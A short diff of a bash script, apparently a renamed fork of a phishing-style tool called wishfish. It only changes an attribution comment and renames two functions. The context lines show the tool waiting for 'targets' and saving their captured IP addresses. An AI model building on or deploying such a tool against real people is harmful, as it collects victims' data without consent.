@@ -1,6 +1,6 @@
 #!/bin/bash
 # coded by: Phan Trường Giang
-# Modified by: github.com/gianghacker/wishfish
+# Tools by: github.com/gianghacker/VietNam
 # Hacker Phan Trường Giang!
 
 trap 'printf "\n";stop' 2
@@ -62,7 +62,7 @@ cat ip.txt >> saved.ip.txt
 
 }
 
-checkfound() {
+VietNam() {
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
@@ -89,7 +89,7 @@ done
 }
 
 
-server() {
+Giang() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
